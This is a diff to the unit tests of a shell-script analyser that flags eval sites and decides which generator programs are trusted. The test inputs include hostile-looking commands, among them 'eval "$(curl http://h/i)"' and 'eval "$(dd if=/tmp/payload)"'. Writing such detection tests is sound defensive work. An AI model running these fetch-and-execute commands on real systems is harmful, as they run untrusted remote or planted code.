@@ -33,6 +33,8 @@ class AnalyserReportsEvaluatedPrograms(unittest.TestCase):
         self.assertEqual(analyze('eval "$(curl http://h/i)"')["evaluated_programs"], [])
         result = analyze('x=$(dircolors); eval "$x"')
         self.assertEqual((result["evaluated_programs"], result["unresolved_expansions"]), ([], 1))
+        self.assertEqual(result["qualified_eval_sites"], [])
+        self.assertEqual(result["unresolved_non_eval_sites"], 1)
         mixed = analyze('eval "$(dircolors -b)"\n$CMD --x\n')
         self.assertEqual((mixed["evaluated_programs"], mixed["unresolved_expansions"]), (["dircolors"], 2))
 
@@ -42,6 +44,15 @@ class AnalyserReportsEvaluatedPrograms(unittest.TestCase):
         counted = analyze("sh -c '$CMD --x'\n$OTHER\n")
         self.assertEqual(counted["unresolved_expansions"], 2)
         self.assertEqual(counted["evaluated_programs"], [])
+
+    def test_nested_qualification_and_non_eval_uncertainty_are_preserved(self):
+        qualified = analyze("bash -c 'eval \"$(dircolors -b)\"'")
+        self.assertEqual(qualified["qualified_eval_sites"], ["dircolors"])
+        self.assertEqual(qualified["unresolved_non_eval_sites"], 0)
+        mixed = analyze("bash -c 'eval \"$(dircolors -b)\"; $UNKNOWN --flag'")
+        self.assertEqual(mixed["qualified_eval_sites"], ["dircolors"])
+        self.assertEqual(mixed["unresolved_non_eval_sites"], 1)
+        self.assertEqual(mixed["unresolved_expansions"], 2)
 
     def test_eval_of_a_temp_program_is_still_a_pattern(self):
         result = analyze('eval "$(/tmp/.x/gen)"')
@@ -82,8 +93,10 @@ class AttestedProgramResolution(unittest.TestCase):
         self.assertIsNone(self.audit._attested_program("zoxide"), "/usr/local is not a packaged location")
         self.assertIsNone(self.audit._attested_program("missing"))
         self.assertIsNone(self.audit._attested_program("/tmp/.x"))
+        self.assertIsNone(self.audit._attested_program("/usr/bin//dircolors"))
+        self.assertIsNone(self.audit._attested_program("/usr/bin/./dircolors"))
         self.assertIsNone(self.audit._attested_program(""))
-        self.assertEqual(self.audit._attested_program("onlyinbin"), self.root / "bin/onlyinbin", "later directories are searched")  # :1158
+        self.assertIsNone(self.audit._attested_program("onlyinbin"), "unreviewed generators cannot inherit package trust")
         self.assertIsNone(self.audit._attested_program("linked"), "a symlink is never taken, attested or not")          # :1157
 
     def decide(self, text: str) -> Gaps:
@@ -97,6 +110,9 @@ class AttestedProgramResolution(unittest.TestCase):
         for text in ('eval "$(starship init bash)"',                 # not attested
                      'eval "$(cat ~/.hook)"',                        # relay program: output is its input
                      'eval "$(dircolors -b)"\n$CMD\n',               # another unresolved site remains
+                     'eval "$(dircolors -b) $hook"',                 # mixed dynamic code in one eval operand
+                     'eval "$(dircolors -b)" literal',                # multiple operands are not isolated
+                     'eval "$(dd if=/tmp/payload)"',                  # relay reads arbitrary user content
                      'x=$(dircolors); eval "$x"',                    # dataflow through a variable
                      'eval "$(dircolors -b)"\ncat <<EOF\n'):        # a second kind of limitation
             gaps = self.decide(text)
